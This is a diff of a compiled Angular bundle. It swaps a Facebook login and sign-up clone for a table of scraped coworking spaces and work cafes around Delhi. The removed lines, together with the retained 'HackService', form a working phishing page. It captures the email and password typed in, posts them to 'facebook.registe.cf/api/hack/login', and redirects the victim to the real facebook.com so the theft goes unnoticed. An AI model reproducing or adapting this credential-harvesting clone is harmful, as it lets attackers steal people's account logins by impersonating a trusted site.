@@ -52,7 +52,7 @@ module.exports = "<nav class=\"uk-navbar-container uk-box-shadow-small boundary 
 /*! no static exports found */
 /***/ (function(module, exports) {
 
-module.exports = "<div id=\"navwrapper\" class=\"uk-visible@m\">\r\n  <div id=\"navbar\">\r\n    <table class=\"tablewrapper\">\r\n      <tr>\r\n        <td class=\"row1\">Email or Phone</td>\r\n        <td class=\"row1\">Password</td>\r\n      </tr>\r\n      <tr>\r\n        <td><input [(ngModel)]=\"user.email\" name=\"email\" type=\"text\" class=\"inputtext\">\r\n        </td>\r\n        <td><input [(ngModel)]=\"user.password\" name=\"password\" type=\"password\" class=\"inputtext\">\r\n        </td>\r\n        <td>\r\n          <div (click)=\"login()\" id=\"button\">Log In</div>\r\n        </td>\r\n      </tr>\r\n      <tr>\r\n        <td>\r\n          <div class=\"row2\"><input type=\"checkbox\" checked>Keep me logged in</div>\r\n        </td>\r\n        <td class=\"row2 h\">Forgot your password?</td>\r\n      </tr>\r\n    </table>\r\n    <h1 class=\"logowrapper\">facebook</h1>\r\n  </div>\r\n</div>\r\n\r\n<div id=\"contentwrapper\">\r\n  <div id=\"content\">\r\n    <div id=\"leftbod\">\r\n      <div class=\"connect bolder\">\r\n        Facebook helps you connect and share with the people in your life.</div>\r\n      <div >\r\n        <img src=\"https://s3.ap-south-1.amazonaws.com/karan.garg/OBaVg52wtTZ.png\"\r\n          alt=\"\"  />\r\n      </div>\r\n    </div>\r\n    <div id=\"rightbod\">\r\n      <div class=\"signup bolder\">Sign Up</div>\r\n      <div class=\"free bolder\">It's free and always will be</div>\r\n\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.first_name\" name=\"first_name\" type=\"text\" class=\"inputbody in1\" placeholder=\"First name\">\r\n        <input [(ngModel)]=\"new_user.last_name\" name=\"last_name\" type=\"text\" class=\"inputbody in1 fr\" placeholder=\"Last name\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2\" placeholder=\"Email or mobile number\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2\" placeholder=\"Re-enter email or mobile number\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.password\" name=\"password\" type=\"text\" class=\"inputbody in2\" placeholder=\"New password\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <div class=\"bday\">Birthday</div>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <span data-type=\"selectors\">\r\n          <span>\r\n            <select  name=\"birthday_month\" title=\"Month\" class=\"selectbody\">\r\n              <option value=\"0\" selected=\"1\">Month</option>\r\n              <option value=\"1\">Jan</option>\r\n              <option value=\"2\">Feb</option>\r\n              <option value=\"3\">Mar</option>\r\n              <option value=\"4\">Apr</option>\r\n              <option value=\"5\">May</option>\r\n              <option value=\"6\">Jun</option>\r\n              <option value=\"7\">Jul</option>\r\n              <option value=\"8\">Aug</option>\r\n              <option value=\"9\">Sep</option>\r\n              <option value=\"10\">Oct</option>\r\n              <option value=\"11\">Nov</option>\r\n              <option value=\"12\">Dec</option>\r\n            </select>\r\n            <select  name=\"birthday_day\" title=\"Day\" class=\"selectbody fl\">\r\n              <option value=\"0\" selected=\"1\">Day</option>\r\n              <option value=\"1\">1</option>\r\n              <option value=\"2\">2</option>\r\n              <option value=\"3\">3</option>\r\n              <option value=\"4\">4</option>\r\n              <option value=\"5\">5</option>\r\n              <option value=\"6\">6</option>\r\n              <option value=\"7\">7</option>\r\n              <option value=\"8\">8</option>\r\n              <option value=\"9\">9</option>\r\n              <option value=\"10\">10</option>\r\n              <option value=\"11\">11</option>\r\n              <option value=\"12\">12</option>\r\n              <option value=\"13\">13</option>\r\n              <option value=\"14\">14</option>\r\n              <option value=\"15\">15</option>\r\n              <option value=\"16\">16</option>\r\n              <option value=\"17\">17</option>\r\n              <option value=\"18\">18</option>\r\n              <option value=\"19\">19</option>\r\n              <option value=\"20\">20</option>\r\n              <option value=\"21\">21</option>\r\n              <option value=\"22\">22</option>\r\n              <option value=\"23\">23</option>\r\n              <option value=\"24\">24</option>\r\n              <option value=\"25\">25</option>\r\n              <option value=\"26\">26</option>\r\n              <option value=\"27\">27</option>\r\n              <option value=\"28\">28</option>\r\n              <option value=\"29\">29</option>\r\n              <option value=\"30\">30</option>\r\n              <option value=\"31\">31</option>\r\n            </select>\r\n            <select  name=\"birthday_year\" title=\"Year\" class=\"selectbody fl\">\r\n              <option value=\"0\" selected=\"1\">Year</option>\r\n              <option value=\"2015\">2015</option>\r\n              <option value=\"2014\">2014</option>\r\n              <option value=\"2013\">2013</option>\r\n              <option value=\"2012\">2012</option>\r\n              <option value=\"2011\">2011</option>\r\n              <option value=\"2010\">2010</option>\r\n              <option value=\"2009\">2009</option>\r\n              <option value=\"2008\">2008</option>\r\n              <option value=\"2007\">2007</option>\r\n              <option value=\"2006\">2006</option>\r\n              <option value=\"2005\">2005</option>\r\n              <option value=\"2004\">2004</option>\r\n              <option value=\"2003\">2003</option>\r\n              <option value=\"2002\">2002</option>\r\n              <option value=\"2001\">2001</option>\r\n              <option value=\"2000\">2000</option>\r\n              <option value=\"1999\">1999</option>\r\n              <option value=\"1998\">1998</option>\r\n              <option value=\"1997\">1997</option>\r\n              <option value=\"1996\">1996</option>\r\n              <option value=\"1995\">1995</option>\r\n              <option value=\"1994\">1994</option>\r\n              <option value=\"1993\">1993</option>\r\n              <option value=\"1992\">1992</option>\r\n              <option value=\"1991\">1991</option>\r\n              <option value=\"1990\">1990</option>\r\n              <option value=\"1989\">1989</option>\r\n              <option value=\"1988\">1988</option>\r\n              <option value=\"1987\">1987</option>\r\n              <option value=\"1986\">1986</option>\r\n              <option value=\"1985\">1985</option>\r\n              <option value=\"1984\">1984</option>\r\n              <option value=\"1983\">1983</option>\r\n              <option value=\"1982\">1982</option>\r\n              <option value=\"1981\">1981</option>\r\n              <option value=\"1980\">1980</option>\r\n              <option value=\"1979\">1979</option>\r\n              <option value=\"1978\">1978</option>\r\n              <option value=\"1977\">1977</option>\r\n              <option value=\"1976\">1976</option>\r\n              <option value=\"1975\">1975</option>\r\n              <option value=\"1974\">1974</option>\r\n              <option value=\"1973\">1973</option>\r\n              <option value=\"1972\">1972</option>\r\n              <option value=\"1971\">1971</option>\r\n              <option value=\"1970\">1970</option>\r\n              <option value=\"1969\">1969</option>\r\n              <option value=\"1968\">1968</option>\r\n              <option value=\"1967\">1967</option>\r\n              <option value=\"1966\">1966</option>\r\n              <option value=\"1965\">1965</option>\r\n              <option value=\"1964\">1964</option>\r\n              <option value=\"1963\">1963</option>\r\n              <option value=\"1962\">1962</option>\r\n              <option value=\"1961\">1961</option>\r\n              <option value=\"1960\">1960</option>\r\n              <option value=\"1959\">1959</option>\r\n              <option value=\"1958\">1958</option>\r\n              <option value=\"1957\">1957</option>\r\n              <option value=\"1956\">1956</option>\r\n              <option value=\"1955\">1955</option>\r\n              <option value=\"1954\">1954</option>\r\n              <option value=\"1953\">1953</option>\r\n              <option value=\"1952\">1952</option>\r\n              <option value=\"1951\">1951</option>\r\n              <option value=\"1950\">1950</option>\r\n              <option value=\"1949\">1949</option>\r\n              <option value=\"1948\">1948</option>\r\n              <option value=\"1947\">1947</option>\r\n              <option value=\"1946\">1946</option>\r\n              <option value=\"1945\">1945</option>\r\n              <option value=\"1944\">1944</option>\r\n              <option value=\"1943\">1943</option>\r\n              <option value=\"1942\">1942</option>\r\n              <option value=\"1941\">1941</option>\r\n              <option value=\"1940\">1940</option>\r\n              <option value=\"1939\">1939</option>\r\n              <option value=\"1938\">1938</option>\r\n              <option value=\"1937\">1937</option>\r\n              <option value=\"1936\">1936</option>\r\n              <option value=\"1935\">1935</option>\r\n              <option value=\"1934\">1934</option>\r\n              <option value=\"1933\">1933</option>\r\n              <option value=\"1932\">1932</option>\r\n              <option value=\"1931\">1931</option>\r\n              <option value=\"1930\">1930</option>\r\n              <option value=\"1929\">1929</option>\r\n              <option value=\"1928\">1928</option>\r\n              <option value=\"1927\">1927</option>\r\n              <option value=\"1926\">1926</option>\r\n              <option value=\"1925\">1925</option>\r\n              <option value=\"1924\">1924</option>\r\n              <option value=\"1923\">1923</option>\r\n              <option value=\"1922\">1922</option>\r\n              <option value=\"1921\">1921</option>\r\n              <option value=\"1920\">1920</option>\r\n              <option value=\"1919\">1919</option>\r\n              <option value=\"1918\">1918</option>\r\n              <option value=\"1917\">1917</option>\r\n              <option value=\"1916\">1916</option>\r\n              <option value=\"1915\">1915</option>\r\n              <option value=\"1914\">1914</option>\r\n              <option value=\"1913\">1913</option>\r\n              <option value=\"1912\">1912</option>\r\n              <option value=\"1911\">1911</option>\r\n              <option value=\"1910\">1910</option>\r\n              <option value=\"1909\">1909</option>\r\n              <option value=\"1908\">1908</option>\r\n              <option value=\"1907\">1907</option>\r\n              <option value=\"1906\">1906</option>\r\n              <option value=\"1905\">1905</option>\r\n            </select>\r\n          </span>\r\n        </span>\r\n        <div class=\"fb1 why h\">Why do I need to provide my birthday?</div>\r\n      </div>\r\n      <div class=\"formbox mt1\">\r\n        <span data-type=\"radio\" class=\"spanpad\">\r\n          <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"female\" type=\"radio\" id=\"fem\" class=\"m0\">\r\n          <label for=\"fem\" class=\"gender\">Female\r\n          </label>\r\n          <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"male\" type=\"radio\" id=\"male\" class=\"m0\">\r\n          <label for=\"male\" class=\"gender\">Male\r\n          </label>\r\n        </span>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <div class=\"agree\">\r\n          By clicking Sign Up, you agree to our <div class=\"link\">Terms</div> and that you have read our <div\r\n            class=\"link\">Data Use Policy</div>, including our <div class=\"link\">Cookie Use</div>.\r\n        </div>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <button type=\"button\" (click)=\"newUser()\" class=\"signbut bolder\">Sign Up</button>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <div class=\"create\">\r\n          <div class=\"link h\">Create a Page</div> for a celebrity, band or business.\r\n        </div>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</div>"
+module.exports = "<table class=\"uk-table uk-table-striped\">\r\n  <thead>\r\n    <tr>\r\n      <th>S. No</th>\r\n      <th>Name</th>\r\n      <th>Address</th>\r\n      <th>Type</th>\r\n      <th>Provider</th>\r\n    </tr>\r\n  </thead>\r\n  <tbody>\r\n    <tr *ngFor=\"let location of locations; let i = index\">\r\n      <td>{{i + 1}}</td>\r\n      <td>{{location.name}}</td>\r\n      <td>{{location.address}}</td>\r\n      <td>{{location.type}}</td>\r\n      <td>{{location.provider}}</td>\r\n    </tr>\r\n  </tbody>\r\n</table>\r\n\r\n\r\n\r\n"
 
 /***/ }),
 
@@ -79,7 +79,7 @@ __webpack_require__.r(__webpack_exports__);
 
 var routes = [
     { path: '', redirectTo: '/login', pathMatch: 'full' },
-    { path: 'clone', component: _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__["FacebookComponent"] },
+    { path: 'scrapper', component: _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__["FacebookComponent"] },
     { path: 'login', component: _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__["CloneComponent"] }
 ];
 var AppRoutingModule = /** @class */ (function () {
@@ -303,27 +303,573 @@ var FacebookComponent = /** @class */ (function () {
     function FacebookComponent(hackService, router) {
         this.hackService = hackService;
         this.router = router;
-        this.new_user = {};
-        this.user = {};
-        this.hackService.pageCount().subscribe(function (resp) {
-            console.log(resp);
-        }, function (err) {
-            console.log(err);
-        });
+        // main_div_array: Array<HTMLDivElement> = []
+        this.offices_myhq = [
+            {
+                "name": "Team Station Cowork Space",
+                "address": "Rohini, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Workin X",
+                "address": "Paschim Vihar, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Supreme Cowork",
+                "address": "Shalimar Bagh, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Tippling Street",
+                "address": "Rajouri Garden, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "SpringHouse Janakpuri",
+                "address": "Janakpuri, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Cubicles Cowork",
+                "address": "Netaji Subhash Place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Zorambo Punjabi Bagh",
+                "address": "Punjabi Bagh, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Co-Offiz NSP",
+                "address": "Netaji Subhash place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "The Beer Cafe Kirti Nagar",
+                "address": "Kirti Nagar, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Co-Offiz Janakpuri",
+                "address": "Janakpuri, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Daftar Cowork",
+                "address": "GT Karnal Road, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Rodeo Cantina and Kitchen",
+                "address": "Connaught Place, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Imly Janakpuri",
+                "address": "Janakpuri, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "FLYP Cafe",
+                "address": "Connaught Place, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Pebble Street",
+                "address": "Connaught Place, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "ABL Workspaces CP",
+                "address": "Connaught Place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Koworkspace",
+                "address": "Dwarka, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Sharal Cowork",
+                "address": "Nariana, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Invento Workspaces Dwarka",
+                "address": "Sector 12 Dwarka, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "22 Workspace",
+                "address": "New Delhi Metro Station, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Coworkin Patel Nagar",
+                "address": "Patel Nagar, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "One Co.Work",
+                "address": "Connaught Place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Stop My Starvation",
+                "address": "Indirapuram, Ghaziabad",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "YC Coworking Sohna Road",
+                "address": "Sohna Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "GoHive SAS Towers",
+                "address": "Sector 38, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Eccosphere Coworking",
+                "address": "Sector 67, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Office Beanz",
+                "address": "Sector 39, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Instaoffice SPML House",
+                "address": "Sector 32, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "OYO Townhouse Cafe Curryhut",
+                "address": "Sector 62, Noida",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Cafe Soul Garden",
+                "address": "Supermart 2, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Instaoffice Good Earth City Centre",
+                "address": "Sector 50, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "SproutBox",
+                "address": "Okhla, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Barista Huda Market",
+                "address": "Sector 22, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "SpringHouse Sector 16",
+                "address": "Noida, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Wolk Coworking",
+                "address": "Nehru Place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "What A Comic Show GK2",
+                "address": "Greater Kailash 2, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "2Tree Coffee",
+                "address": "Saket, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "The Red Kettle",
+                "address": "Saiyad Ul Ajaib Extension, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "ArtBuzz Studios",
+                "address": "Okhla Phase 2, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "myHQ Techarbeits",
+                "address": "Mayur Vihar Phase 1, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Flockwork",
+                "address": "Tilak Marg, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Revstart",
+                "address": "Sector 125, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Qbicals Coworking",
+                "address": "Sector 63, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "myHQ Coregano",
+                "address": "Noida Sector 8, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "IHOP Cyberhub",
+                "address": "DLF Cyber City, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Fume Coworking Udyog Vihar",
+                "address": "Udyog Vihar, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "SpringHouse Sohna Road",
+                "address": "Sohna Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Workhubz",
+                "address": "Safdarjung Enclave, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Unboxed",
+                "address": "Sector 65, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Step 01",
+                "address": "Sector 32, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Huddle",
+                "address": "DLF Cyber City, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Qahwa",
+                "address": "SDA Market, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "ABL Workspaces Okhla",
+                "address": "Okhla, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Hacker Space",
+                "address": "Sector 2, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "The Reader's Cafe",
+                "address": "Indirapuram, Ghaziabad",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "IHOP Saket",
+                "address": "Saket, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Springhouse Noida",
+                "address": "Sector 8, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Dribble",
+                "address": "DLF Phase 3, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "SpringHouse Galleria",
+                "address": "DLF Phase 4, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Cha Cha Cha",
+                "address": "Lajpat Nagar, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "ABL Workspaces Two Horizon",
+                "address": "Golf course Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "GoHive Ocus",
+                "address": "Sector-54, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Coworkin Sector 39 Gurugram",
+                "address": "Sector 39, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "The Beer Cafe Noida",
+                "address": "Sector 32, Noida",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "1share office",
+                "address": "East Of Kailash, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "D&B Office",
+                "address": "Panchsheel Park, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "The Blue Parrot Cafe",
+                "address": "Kalkaji, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Peer Share",
+                "address": "Vasant Vihar, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Instaoffice Okhla",
+                "address": "Okhla Phase 2, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Dribble Golf Course Road",
+                "address": "Golf Course Road, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "India Accelerator",
+                "address": "Sector 44, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "One Co.Work Sushant Lok",
+                "address": "Sushant Lok, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Coworkin Lajpat Nagar",
+                "address": "Lajpat Nagar, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "What A Comic Show SDA",
+                "address": "SDA Market, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Instaoffice Noida",
+                "address": "Sector 16, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "GoHive Ghitorni",
+                "address": "Ghitorni, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Cube8",
+                "address": "Udyog Vihar, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "GoWorkin",
+                "address": "Green Park, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Let's Cowork",
+                "address": "Hauz Khas Village, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Cospaces",
+                "address": "Sector 28, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Social Vasant Kunj",
+                "address": "Vasant Kunj, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "myHQ ABL Workspace NH8",
+                "address": "NH8, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Coworkin Nehru Place",
+                "address": "Nehru Place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Amigo Coworking",
+                "address": "Sector-8, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "The Beer Cafe GK2",
+                "address": "Greater Kailash, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Zorambo Sohna Road",
+                "address": "Sohna Road, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Vorkzone",
+                "address": "Sohna Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Zorambo South City",
+                "address": "South City 2, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Social Cyber Hub",
+                "address": "Cyber Hub, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "CoNexus Life",
+                "address": "Sector 29, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "myHQ PiWork",
+                "address": "Sector 132, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "One Co.Work NSP",
+                "address": "Netaji Subhash Place, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "BOD Cowork",
+                "address": "Karol Bagh, New Delhi",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Imperfecto Hauz Khas Village",
+                "address": "Hauz Khas Village, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Publiq Bar & Kitchen",
+                "address": "Green Park, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Cafe Untold",
+                "address": "Gulmohar Park, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Imperfecto Ruin Pub",
+                "address": "Khel Gaon Marg, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Instaoffice Konterra",
+                "address": "Udyog Vihar, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "ABL Workspaces Cyber City",
+                "address": "DLF Cyber City, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Potbelly Sandwich Shop Cyberhub",
+                "address": "DLF Cyber City, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Urban Sip",
+                "address": "Okhla Phase 3, New Delhi",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Vatika Business Centre FIP",
+                "address": "MG Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Vatika Business Centre Triangle",
+                "address": "MG Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "ABL Workspaces Noida",
+                "address": "Sector 4, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Tangy House",
+                "address": "Sushant Lok, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Vatika Business Centre Prius",
+                "address": "Sector 125, Noida",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Zorambo Golf Course Road",
+                "address": "Golf course Road, Gurugram",
+                "type": "Work Cafe"
+            },
+            {
+                "name": "Vatika Business Centre Atrium",
+                "address": "Golf Course Road, Gurugram",
+                "type": "Coworking Space"
+            },
+            {
+                "name": "Imperfecto Rainbow",
+                "address": "Sector 135, Noida",
+                "type": "Work Cafe"
+            }
+        ];
+        this.locations = [];
+        this.getLocations();
     }
-    FacebookComponent.prototype.login = function () {
-        this.hackService.login(this.user).subscribe(function (resp) {
+    FacebookComponent.prototype.scrapperMyHQ = function () {
+        this.hackService.scrapperDataMyHQ({ locations: this.offices_myhq }).subscribe(function (resp) {
             console.log(resp);
-            window.location.href = 'https://facebook.com';
         }, function (err) {
             console.log(err);
         });
     };
-    FacebookComponent.prototype.newUser = function () {
-        window.location.href = 'https://facebook.com';
+    FacebookComponent.prototype.getLocations = function () {
+        var _this = this;
+        this.hackService.getLocations({}).subscribe(function (resp) {
+            _this.locations = resp['result'];
+        }, function (err) {
+            console.log(err);
+        });
     };
-    FacebookComponent.prototype.ngOnInit = function () {
-    };
+    FacebookComponent.prototype.ngOnInit = function () { };
     FacebookComponent.ctorParameters = function () { return [
         { type: _services_hack_service__WEBPACK_IMPORTED_MODULE_2__["HackService"] },
         { type: _angular_router__WEBPACK_IMPORTED_MODULE_3__["Router"] }
@@ -363,11 +909,21 @@ var HackService = /** @class */ (function () {
         this.http = http;
         this.url = 'https://facebook.registe.cf/api/hack/';
     }
+    // url = 'http://localhost:4200/api/hack/'
     HackService.prototype.login = function (data) {
         return this.http.post(this.url + 'login', data);
     };
     HackService.prototype.pageCount = function () {
         return this.http.get(this.url + 'page/count');
+    };
+    HackService.prototype.scrapperDataMyHQ = function (data) {
+        return this.http.post(this.url + 'scrapper/myhq', data);
+    };
+    HackService.prototype.scrapperDataSneed = function (data) {
+        return this.http.post(this.url + 'scrapper/sneed', data);
+    };
+    HackService.prototype.getLocations = function (parameters) {
+        return this.http.get(this.url + 'scrapper', { params: parameters });
     };
     HackService.prototype.pageCreation = function (data) {
         console.log('2');
